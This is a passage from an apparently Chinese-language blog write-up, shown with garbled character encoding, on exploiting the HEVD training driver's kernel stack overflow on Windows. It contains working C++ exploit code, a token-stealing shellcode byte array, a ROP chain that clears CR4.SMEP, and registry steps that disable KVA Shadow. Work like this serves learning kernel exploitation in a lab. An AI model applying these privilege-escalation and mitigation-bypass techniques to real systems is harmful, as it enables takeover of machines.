&amp;pi)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] FATAL: Error spawning cmd.exe\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Updating our shellcode to search for PID %d\n&quot;</span>, pi.dwProcessId);</span><br><span class="line">*(DWORD*)((<span class="type">char</span>*)shellcode + <span class="number">27</span>) = pi.dwProcessId;</span><br><span class="line"></span><br><span class="line"><span class="built_in">DeviceIoControl</span>(hDevice, ioctl,</span><br><span class="line">stackspace, size,</span><br><span class="line"><span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">&amp;info, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;info: %d\n&quot;</span>, info);</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;IO Complete\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/b79e4ef722ad8e26cab88c67a5224aa1.png" alt="image-20240118002020265" /></p><p>ç„¶ååˆ°retè¿”å›ï¼ŒæŸ¥çœ‹è¿”å›åœ°å€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">k</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/4c65cdde199c60120b262e70f5635485.png" alt="image-20240118002154225" /></p><p>å‘ç°è¿”å›åœ°åœ°å€å·²ç»è¢«è¦†ç›–äº†ï¼Œç»§ç»­èµ°ä¸‹å»</p><p><img src="https://img.joe1sn.top/uploads/big/4d009e4de60cbc5e00a14daaee7b7ab1.png" alt="image-20240118002325326" /></p><p>è·³è½¬åˆ°äº†shellcodeäº†ï¼Œå†èµ°ä¸¤æ­¥</p><p><img src="https://img.joe1sn.top/uploads/big/777b9bff2c6634898c68adf02ca19a72.png" alt="image-20240118002504625" /></p><p>ï¼Ÿï¼Ÿï¼Ÿ</p><p><img src="https://img.joe1sn.top/uploads/big/1ab88b491fdcf9a1627f14b8a708a8ed.png" alt="image-20240118002613223" /></p><p><img src="https://img.joe1sn.top/uploads/big/b1b94aa13dbf421338b2bf2ac25a1827.png" alt="image-20240118003040168" /></p><p>è¯´æˆ‘åœ¨æ‰§è¡Œä¸å¯æ‰§è¡Œçš„å†…å­˜ï¼Œä½†æ˜¯æ˜æ˜å·²ç»<code>VirtualProtect(shellcode, 256, PAGE_EXECUTE_READWRITE, &amp;oldProtect);</code></p><p>ï¼Ÿï¼Ÿï¼Ÿè¶Šæ¥è¶Šç¦»è°±äº†</p><p>å°è¯•æŠŠshellcodeç§»åŠ¨åˆ°å¸¸é‡å†…å­˜ä¸­è¯•è¯•ï¼Œè¿˜æ˜¯ä¸è¡Œï¼Œæ¥ç€æˆ‘å†è¿›è¡Œioctlä¹‹å‰pauseä¸€ä¸‹ï¼Œå¥½åƒå¯ä»¥äº†</p><p><img src="https://img.joe1sn.top/uploads/big/a1b311e4b3eef101d2e0a98327149622.png" alt="image-20240118013041535" /></p><p>ä½†æ˜¯ä¾ç„¶è¢«è¯´æ‰§è¡Œä¸å¯æ‰§è¡Œä»£ç </p><h1 id="æ–°çš„ä¿æŠ¤æœºåˆ¶"><a class="markdownIt-Anchor" href="#æ–°çš„ä¿æŠ¤æœºåˆ¶"></a> æ–°çš„ä¿æŠ¤æœºåˆ¶</h1><p>æŸ¥äº†<a href="https://h0mbre.github.io/HEVD_Stackoverflow_SMEP_Bypass_64bit/#">å…¶ä»–çš„è§£æ³•</a>ï¼Œå‘ç°Windows 8è¿‡åå¾®è½¯æ·»åŠ äº†ä¸€ä¸ªå«åšSMEPä¿æŠ¤çš„ä¸œè¥¿</p><p>ä½ å¯ä»¥åœ¨è¿™é‡ŒæŸ¥åˆ°å…³äºWindowsçš„æ‰€æœ‰ä¿æŠ¤æœºåˆ¶ï¼š<a href="https://learn.microsoft.com/zh-cn/windows/security/threat-protection/overview-of-threat-mitigations-in-windows-10">https://learn.microsoft.com/zh-cn/windows/security/threat-protection/overview-of-threat-mitigations-in-windows-10</a></p><blockquote><ul><li><strong>ç›‘ç£å™¨æ¨¡å¼æ‰§è¡Œé˜²æŠ¤ (SMEP)</strong> ï¼šå¸®åŠ©é˜²æ­¢å†…æ ¸ (â€œç›‘ç£å™¨â€) åœ¨ç”¨æˆ·é¡µé¢ä¸­æ‰§è¡Œä»£ç ï¼Œè¿™æ˜¯æ”»å‡»è€…ç”¨äºæœ¬åœ°å†…æ ¸æå‡ç‰¹æƒ (EOP) çš„å¸¸è§æŠ€æœ¯ã€‚ æ­¤é…ç½®éœ€è¦åœ¨ Intel Ivy Bridge æˆ–æ›´é«˜ç‰ˆæœ¬å¤„ç†å™¨ä¸­æ‰¾åˆ°å¤„ç†å™¨æ”¯æŒï¼Œæˆ–è€…å…·æœ‰ PXN æ”¯æŒçš„ ARMã€‚</li></ul></blockquote><p>å°è¯•å…³é—­è¯¥ä¿æŠ¤åæ‰§è¡Œexpï¼Œ<strong>ä½†æ˜¯å‘ç°æ˜¯æ— æ³•å…³é—­çš„</strong>ï¼Œç”±äºå†…æ ¸çš„æ•´ä½“è®¾è®¡å¯¼è‡´è¯¥ä¿æŠ¤åœ¨windows8åŠä»¥ä¸Šæ˜¯ä¸èƒ½è¢«å…³é—­çš„ï¼Œé‚£ä¹ˆå°±åªèƒ½æƒ³åŠæ³•ç»•è¿‡äº†</p><h2 id="a-smepä¿æŠ¤æœºåˆ¶åŠæ‰‹åŠ¨ç»•è¿‡"><a class="markdownIt-Anchor" href="#a-smepä¿æŠ¤æœºåˆ¶åŠæ‰‹åŠ¨ç»•è¿‡"></a> A. SMEPä¿æŠ¤æœºåˆ¶åŠæ‰‹åŠ¨ç»•è¿‡</h2><p>è¯¥ä¿æŠ¤æœºåˆ¶å¼ºçƒˆä¾èµ–äºCPUçš„<code>RC4</code>å¯„å­˜å™¨ï¼Œåˆšå¥½æˆ‘è¿™é‡Œæœ‰ã€Šè‹±ç‰¹å°”Â® 64 ä½å’Œ IA-32 æ¶æ„å¼€å‘äººå‘˜æ‰‹å†Œåˆè®¢æœ¬ã€‹ï¼Œç¿»å‡ºæ¥çœ‹ä¸€ä¸‹</p><p><img src="https://img.joe1sn.top/uploads/big/8dceeeeaf9a0251f0b359cf99c2c1099.png" alt="image-20240118103701065" /></p><blockquote><p>[æœºç¿»]ä»ç”¨æˆ·æ¨¡å¼åœ°å€è·å–æŒ‡ä»¤ã€‚<br />è®¿é—®æƒé™å–å†³äº CR4.SMEP çš„å€¼ï¼š<br />â€¢ å¦‚æœCR4.SMEP = 0ï¼Œè®¿é—®æƒé™å–å†³äºåˆ†é¡µæ¨¡å¼å’ŒIA32_EFER.NXE çš„å€¼ï¼š<br />â€” å¯¹äº 32 ä½åˆ†é¡µæˆ–å¦‚æœ IA32_EFER.NXE = 0ï¼Œåˆ™å¯ä»¥ä»ä»»ä½•ç”¨æˆ·æ¨¡å¼è·å–æŒ‡ä»¤<br />åœ°å€ã€‚<br />â€” å¯¹äº IA32_EFER.NXE = 1 çš„å…¶ä»–åˆ†é¡µæ¨¡å¼ï¼Œå¯ä»¥é€šè¿‡æ¯ä¸ªåˆ†é¡µç»“æ„æ¡ç›®ä¸­ XD æ ‡å¿—ä¸º 0 çš„è½¬æ¢ä»ä»»ä½•ç”¨æˆ·æ¨¡å¼åœ°å€è·å–æŒ‡ä»¤<br />æ§åˆ¶ç¿»è¯‘ï¼› æŒ‡ä»¤å¯èƒ½æ— æ³•ä»ä»»ä½•ç”¨æˆ·æ¨¡å¼åœ°å€è·å–<br />åœ¨ä»»ä½•æ§åˆ¶è½¬æ¢çš„åˆ†é¡µç»“æ„æ¡ç›®ä¸­ XD æ ‡å¿—ä¸º 1 çš„è½¬æ¢ã€‚<br />â€¢ å¦‚æœCR4.SMEP = 1ï¼Œåˆ™ä¸èƒ½ä»ä»»ä½•ç”¨æˆ·æ¨¡å¼åœ°å€è·å–æŒ‡ä»¤ã€‚<br />â€” ä»…å…è®¸å¯¹ç®¡ç†å‘˜æ¨¡å¼å½±å­å †æ ˆåœ°å€è¿›è¡Œç®¡ç†å‘˜æ¨¡å¼å½±å­å †æ ˆè®¿é—®<br />ï¼ˆå¾€ä¸Šçœ‹ï¼‰ã€‚</p></blockquote><p>æˆ–è®¸æˆ‘ä»¬å°†<code>CR4.SMEP</code>çš„å€¼è®¾ç½®ä¸º<code>0</code>ï¼Œè®¿é—®æƒé™ç”±é¡µä¸­çš„U/Sæ ‡å¿—ä½å†³å®š</p><p>CR4å¯„å­˜å™¨çš„ç»“æ„å¦‚ä¸‹ï¼ˆå°ç«¯åºé¡ºåºä»å³å‘å·¦ï¼‰ï¼š</p><p><img src="https://img.joe1sn.top/uploads/big/f39ac47992f037a218a801528db29eb5.png" alt="image-20240118105721560" /></p><p>ä¸æ€¥ï¼Œç»§ç»­æœç´¢å‘ç°äº†ä¸€ä»½Intelå…³äºSMEPçš„æ›´è¯¦ç»†çš„æè¿°</p><p>æ–‡æ¡£ï¼š<a href="https://web.archive.org/web/20160803075007/https://www.ncsi.com/nsatc11/presentations/wednesday/emerging_technologies/fischer.pdf">https://web.archive.org/web/20160803075007/https://www.ncsi.com/nsatc11/presentations/wednesday/emerging_technologies/fischer.pdf</a></p><p>å°è¯•ä½¿ç”¨è°ƒè¯•èµ·ä¿®æ”¹CR4</p><p><img src="https://img.joe1sn.top/uploads/big/ad5cf6efe1bb2811438dd79964396658.png" alt="image-20240118110623235" /></p><p>å¦‚æœä¿®æ”¹ç¬¬20ä½ä¸º0ï¼Œrcçš„å€¼ä¸º<code>0x270678</code>ï¼Œç„¶è€Œè¿˜æ˜¯ä¸è¡Œ</p><p><img src="https://img.joe1sn.top/uploads/big/358725a8cb68d78d4f738d38b49e1997.png" alt="image-20240118131258807" /></p><h2 id="b-kvas"><a class="markdownIt-Anchor" href="#b-kvas"></a> B. KVAS</h2><p>Windowså†…æ ¸ç¼“è§£æœºåˆ¶ä½¿ç”¨äº†Kva Shadowå†…å­˜ï¼Œæ¯”å¦‚MeltDownæ¼æ´å°±äºæ­¤æœ‰å…³ï¼Œé¦–å…ˆä¸ä¼šè®²ç»†èŠ‚ï¼Œ<strong>åœ¨ä¸‹ä¸€ç¯‡æ–‡ç« ä¼šè®²åˆ°</strong>ï¼Œå°è¯•å°†å…¶å…³é—­</p><p>å†æ³¨å†Œè¡¨<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management</code></p><p>åˆ›å»ºä¸¤ä¸ªDWORDå€¼ï¼š<code>FeatureSettingsOverride </code>  <code>FeatureSettingsOverrideMask</code></p><p>è®¾ç½®å€¼ä¸º3ï¼Œç„¶åé‡å¯</p><p><img src="https://img.joe1sn.top/uploads/big/cb9c56124685a1418f578b2fefd2f119.png" alt="image-20240118140220468" /></p><p>ç°åœ¨æ‰‹åŠ¨è®¾ç½®cr4.SMEPä¸º0</p><p><img src="https://img.joe1sn.top/uploads/big/c5e4751baecdd52edb64fef20d4d2fb2.png" alt="image-20240118141040651" /></p><p>ç»ˆäºè¿è¡Œäº†</p><p><img src="https://img.joe1sn.top/uploads/big/75325e60ebda69029a1a5f2fcf81358e.png" alt="image-20240118141139354" /></p><p>shellcodeçš„ä¸€äº›åç§»æœ‰é—®é¢˜</p><p><img src="https://img.joe1sn.top/uploads/big/0bd6d7a7b9886ec9c78440be9a38dff5.png" alt="image-20240118142143111" /></p><p>æ›´æ¢ä¸º</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">BYTE cmd[<span class="number">256</span>] = &#123;</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0xb8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x89</span>,</span><br><span class="line"><span class="number">0xc1</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0x48</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x50</span>, <span class="number">0xf8</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xc0</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xfa</span>, <span class="number">0x04</span>, <span class="number">0x75</span>, <span class="number">0xf0</span>, <span class="number">0x49</span>, <span class="number">0x8b</span>, <span class="number">0x50</span>,</span><br><span class="line"><span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xe2</span>, <span class="number">0xf8</span>, <span class="number">0x49</span>, <span class="number">0x8b</span>, <span class="number">0x89</span>, <span class="number">0xb8</span>, <span class="number">0x04</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xe1</span>, <span class="number">0x07</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xca</span>, <span class="number">0x49</span>,</span><br><span class="line"><span class="number">0x89</span>, <span class="number">0x91</span>, <span class="number">0xb8</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x04</span>,</span><br><span class="line"><span class="number">0x25</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x8b</span>, <span class="number">0x88</span>, <span class="number">0xe4</span>, <span class="number">0x01</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0xff</span>, <span class="number">0xc1</span>, <span class="number">0x66</span>, <span class="number">0x89</span>, <span class="number">0x88</span>, <span class="number">0xe4</span>, <span class="number">0x01</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>,</span><br><span class="line"><span class="number">0x8b</span>, <span class="number">0x8a</span>, <span class="number">0x68</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4c</span>, <span class="number">0x8b</span>, <span class="number">0x9a</span>, <span class="number">0x78</span>,</span><br><span class="line"><span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0xa2</span>, <span class="number">0x80</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0xaa</span>, <span class="number">0x58</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x0f</span>,</span><br><span class="line"><span class="number">0x01</span>, <span class="number">0xf8</span>, <span class="number">0x48</span>, <span class="number">0x0f</span>, <span class="number">0x07</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>EXP</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackOverflow</span><span class="params">(HANDLE hDevice, <span class="type">unsigned</span> <span class="type">int</span> ioctl)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> stackspace[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">DWORD oldProtect;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Start Exploit\n&quot;</span>);</span><br><span class="line">LPVOID shellcode_addr = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>,</span><br><span class="line"><span class="built_in">sizeof</span>(cmd),</span><br><span class="line">MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="built_in">memcpy</span>(shellcode_addr, cmd, <span class="built_in">sizeof</span>(cmd));</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> size = <span class="number">0x820</span>;</span><br><span class="line"><span class="built_in">RtlFillMemory</span>(stackspace, <span class="number">0x810</span>, <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x818</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)shellcode_addr;</span><br><span class="line"></span><br><span class="line">DWORD info = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;shellcode space %p\n&quot;</span>, shellcode_addr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Spawning a new cmd.exe process\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">DeviceIoControl</span>(hDevice, ioctl,</span><br><span class="line">stackspace, size,</span><br><span class="line"><span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">&amp;info, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;info: %d\n&quot;</span>, info);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è°ƒè¯•ä¸­æ‰‹åŠ¨CR4.SMEP=0ï¼ˆæ³¨æ„ï¼Œä¹‹å‰å·²ç»å…³é—­äº†KVAï¼‰</p><p><img src="https://img.joe1sn.top/uploads/big/23ad38592a7a932722da80062ab27a04.png" alt="img" /></p><h2 id="c-ä½¿ç”¨å†…æ ¸ropç»•è¿‡smep"><a class="markdownIt-Anchor" href="#c-ä½¿ç”¨å†…æ ¸ropç»•è¿‡smep"></a> C. ä½¿ç”¨å†…æ ¸ROPç»•è¿‡SMEP</h2><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦ä¸€ä¸ªç±»ä¼¼äº<code>mov rc4,xxx</code>çš„ropï¼Œè®©<code>rc4.smep=0</code>ï¼Œ</p><p>å‚è€ƒåœ¨Linuxä¸‹è¿›è¡ŒROPçš„ç»éªŒï¼Œ payloadå¤§è‡´é•¿è¿™æ ·çš„</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x818</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)pop_rcx_ret;</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x820</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)<span class="number">0x00000000002506f8</span>;<span class="comment">//set RCX = currentRC4</span></span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x828</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)mov_rc4_rcx_ret;</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x830</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)shellcode_addr;</span><br></pre></td></tr></table></figure><p>å¤šè°ƒè¯•æˆ–è€…ç¼–ç¨‹è‡ªåŠ¨å¯»æ‰¾å°±å¯ä»¥æ‰¾åˆ°äº†ï¼Œè¿™é‡Œæš‚æ—¶å‚è€ƒ<a href="https://h0mbre.github.io/HEVD_Stackoverflow_SMEP_Bypass_64bit/#">HEVD Exploits â€“ Windows 10 x64 Stack Overflow SMEP Bypass</a></p><p><img src="https://img.joe1sn.top/uploads/big/8de0787e2e202779fce475c08efcd7d0.png" alt="image-20240118154417340" /></p><p><img src="https://img.joe1sn.top/uploads/big/18ad7dc78e36b58f6d1df6045768734e.png" alt="image-20240118154352984" /></p><p>ä¿®æ”¹EXP</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> size = <span class="number">0x840</span>;</span><br><span class="line"><span class="built_in">RtlFillMemory</span>(stackspace, <span class="number">0x810</span>, <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x818</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)<span class="number">0xfffff807743f52c0</span>;</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x820</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)<span class="number">0x00000000002506f8</span>;<span class="comment">//set RCX = currentRC4</span></span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x828</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)<span class="number">0xfffff807749a41cf</span>;</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x830</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)shellcode_addr;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Start set ROP\n&quot;</span>);</span><br></pre></td></tr></table></figure><p>æ²¡æœ‰ä¸‹æ–­ç‚¹ç›´æ¥è¿‡</p><p><img src="https://img.joe1sn.top/uploads/big/263f646ca04327e676129e83d9178406.png" alt="image-20240118154931459" /></p><p><img src="https://img.joe1sn.top/uploads/big/068bbb9c644915e678b8edb21063071b.png" alt="image-20240118154854993" /></p><h1 id="é—ç•™"><a class="markdownIt-Anchor" href="#é—ç•™"></a> é—ç•™</h1><p>ä¸‹ä¸€ç¯‡</p><ul><li>userç¼–ç¨‹å¯»æ‰¾ROPGadget</li><li>shellcodeç¼–å†™</li><li>Tokenææƒ</li><li>KVAS</li></ul><h1 id="å‚è€ƒ"><a class="markdownIt-Anchor" href="#å‚è€ƒ"></a> å‚è€ƒ</h1><p><a href="https://www.bilibili.com/video/BV1pD4y1a7hP/">https://www.bilibili.com/video/BV1pD4y1a7hP/</a></p><p><a href="https://www.cnblogs.com/XiuzhuKirakira/p/16995784.html">https://www.cnblogs.com/XiuzhuKirakira/p/16995784.html</a></p><p><a href="https://blog.xpnsec.com/hevd-stack-overflow">https://blog.xpnsec.com/hevd-stack-overflow</a></p><p><a href="https://h0mbre.github.io/HEVD_Stackoverflow_SMEP_Bypass_64bit">https://h0mbre.github.io/HEVD_Stackoverflow_SMEP_Bypass_64bit</a></p><p><a href="https://learn.microsoft.com/zh-cn/windows/security/threat-protection/overview-of-threat-mitigations-in-windows-10">https://learn.microsoft.com/zh-cn/windows/security/threat-protection/overview-of-threat-mitigations-in-windows-10</a></p><p><a href="https://joe1sn.eu.org/2023/02/17/windows_kernel_driver_2/">https://joe1sn.eu.org/2023/02/17/windows_kernel_driver_2/</a></p><p><a href="https://web.archive.org/web/20160803075007/https://www.ncsi.com/nsatc11/presentations/wednesday/emerging_technologies/fischer.pdf">https://web.archive.org/web/20160803075007/https://www.ncsi.com/nsatc11/presentations/wednesday/emerging_technologies/fischer.pdf</a></p><p><a href="https://wumb0.in/windows-10-kvas-and-software-smep.html">https://wumb0.in/windows-10-kvas-and-software-smep.html</a></p><p><a href="https://github.com/xct/windows-kernel-exploits/">https://github.com/xct/windows-kernel-exploits/</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;åœ¨&lt;a href=&quot;&quot;&gt;ä¸Šä¸€ç¯‡&lt;/a&gt;ä¸­äº†è§£äº†ä¸å†…æ ¸çš„äº¤äº’æ¨¡å¼ï¼Œè¿™é‡Œå°±å¯ä»¥å¼€å§‹åšHEVDäº†&lt;/p&gt;
